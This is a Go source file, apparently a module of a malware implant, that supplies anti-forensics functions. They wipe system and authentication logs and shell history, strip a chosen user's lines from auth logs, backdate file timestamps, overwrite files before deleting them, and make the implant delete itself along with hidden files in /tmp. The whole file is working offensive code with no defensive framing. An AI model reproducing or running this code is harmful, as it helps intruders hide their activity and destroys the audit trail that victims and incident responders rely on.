// Package opsec provides operational security: log wiping, timestomping,
// secure deletion, and self-destruct.
package opsec

import (
	"bufio"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// ClearLogs clears specified log sources.
// what: list of targets — "bash_history", "auth", "syslog", "wtmp", "btmp", "all"
func ClearLogs(what []string) {
	all := false
	for _, w := range what {
		if w == "all" {
			all = true
			break
		}
	}

	wantClear := func(name string) bool {
		if all {
			return true
		}
		for _, w := range what {
			if w == name {
				return true
			}
		}
		return false
	}

	if wantClear("bash_history") {
		clearBashHistory()
	}
	if wantClear("auth") || wantClear("auth.log") {
		truncateLog("/var/log/auth.log")
		truncateLog("/var/log/secure")
	}
	if wantClear("syslog") {
		truncateLog("/var/log/syslog")
		truncateLog("/var/log/messages")
	}
	if wantClear("wtmp") {
		truncateLog("/var/log/wtmp")
	}
	if wantClear("btmp") {
		truncateLog("/var/log/btmp")
	}
	if wantClear("lastlog") {
		truncateLog("/var/log/lastlog")
	}
	if wantClear("dpkg") {
		truncateLog("/var/log/dpkg.log")
	}
	if wantClear("apt") {
		truncateLog("/var/log/apt/history.log")
		truncateLog("/var/log/apt/term.log")
	}
}

func clearBashHistory() {
	// Unset in-memory history
	os.Setenv("HISTFILE", "/dev/null")
	os.Setenv("HISTSIZE", "0")

	// Clear on-disk history files
	home, _ := os.UserHomeDir()
	histFiles := []string{
		filepath.Join(home, ".bash_history"),
		filepath.Join(home, ".zsh_history"),
		filepath.Join(home, ".sh_history"),
		filepath.Join(home, ".history"),
		filepath.Join(home, ".ash_history"),
	}
	for _, f := range histFiles {
		os.Truncate(f, 0)
	}
}

func truncateLog(path string) {
	if f, err := os.OpenFile(path, os.O_WRONLY|os.O_TRUNC, 0); err == nil {
		f.Close()
	}
}

// ClearAuthLogEntries removes lines matching the given username from /var/log/auth.log.
// More surgical than truncating the entire file.
func ClearAuthLogEntries(username string) error {
	logFiles := []string{"/var/log/auth.log", "/var/log/secure"}
	for _, path := range logFiles {
		if err := filterLogFile(path, username); err != nil {
			continue // may not have permission — skip
		}
	}
	return nil
}

func filterLogFile(path, removeContaining string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}

	var kept []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.Contains(line, removeContaining) {
			kept = append(kept, line)
		}
	}
	f.Close()

	return os.WriteFile(path, []byte(strings.Join(kept, "\n")+"\n"), 0640)
}

// Timestomp sets the modification and access times of path to match refPath.
// If refPath is empty, uses a plausible system file timestamp.
func Timestomp(path, refPath string) error {
	var refTime time.Time

	if refPath != "" {
		info, err := os.Stat(refPath)
		if err != nil {
			return fmt.Errorf("timestomp: ref stat: %v", err)
		}
		refTime = info.ModTime()
	} else {
		// Default: make it look like an old system file
		refTime = time.Date(2021, 6, 15, 10, 0, 0, 0, time.UTC)
	}

	return os.Chtimes(path, refTime, refTime)
}

// SecureDelete overwrites a file with random data before deletion.
// Uses 3-pass overwrite: zeros, ones, random — then unlinking.
func SecureDelete(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return err
	}
	size := info.Size()
	if size == 0 {
		return os.Remove(path)
	}

	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	passes := []func(int64) []byte{
		func(n int64) []byte { b := make([]byte, n); return b },                  // zeros
		func(n int64) []byte { b := make([]byte, n); for i := range b { b[i] = 0xFF }; return b }, // ones
		func(n int64) []byte { b := make([]byte, n); rand.Read(b); return b },   // random
	}

	for _, pass := range passes {
		f.Seek(0, io.SeekStart)
		data := pass(size)
		f.Write(data)
		f.Sync()
	}
	f.Close()

	return os.Remove(path)
}

// SelfDestruct removes the implant binary and any artifacts.
func SelfDestruct() {
	self, err := os.Executable()
	if err == nil {
		// Overwrite then delete
		SecureDelete(self)
	}

	// Clean history
	clearBashHistory()

	// On Linux: clear any memfd-based references
	if runtime.GOOS == "linux" {
		selfDestructLinux()
	}
}

func selfDestructLinux() {
	// Remove any dropped files in /tmp
	entries, _ := os.ReadDir("/tmp")
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), ".") {
			os.Remove(filepath.Join("/tmp", e.Name()))
		}
	}
}
